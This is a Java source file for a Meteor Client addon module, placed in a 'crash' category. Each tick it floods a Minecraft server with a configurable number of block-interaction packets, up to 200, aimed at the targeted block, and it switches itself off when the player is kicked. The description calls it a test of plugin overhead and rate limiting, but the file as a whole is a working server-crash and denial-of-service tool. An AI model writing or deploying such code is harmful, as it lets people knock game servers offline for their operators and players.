package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;

public class BlockInteractionSpam extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> interactsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("interacts-per-tick").description("UseItemOn packets to send each tick.")
        .defaultValue(20).range(1, 200).sliderRange(1, 100).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    private int sequence = 0;

    public BlockInteractionSpam() {
        super(AddonTemplate.CRASH_CATEGORY, "block-interaction-spam",
            "Floods block interact packets. Tests plugin event hook overhead and rate limiting.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || mc.world == null) return;
        if (!(mc.crosshairTarget instanceof BlockHitResult hit)) return;
        for (int i = 0; i < interactsPerTick.get(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                Hand.MAIN_HAND, hit, sequence++));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
